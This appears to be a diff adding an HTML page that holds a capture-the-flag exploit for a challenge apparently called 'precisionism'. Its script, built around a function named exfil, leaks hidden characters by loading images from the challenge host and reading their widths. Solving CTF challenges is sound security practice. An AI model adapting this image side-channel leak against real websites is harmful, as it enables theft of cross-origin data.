@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Static Template</title>
+  </head>
+  <body>
+    <h1>
+      This is a static template, there is no bundler or bundling involved!
+    </h1>
+    <script>
+      const sleep = () => new Promise((res) => setTimeout(res, 50));
+      async function exfil(i) {
+        let img = new Image();
+        let p = "00000100020001010000010020006804000026000000";
+        if (i>0) p = p.slice(0, -i);
+        img.src = `https://precisionism.chal.uiuc.tf/?p=${p}`;
+        await img.decode();
+        return img.width;
+      }
+      async function main() {
+        for (let i = 0; i < 16; i++) {
+          let c = await exfil(i);
+          console.log(String.fromCharCode(c)+" "+c)
+        }
+      }
+      main();
+    </script>
+  </body>
+</html>
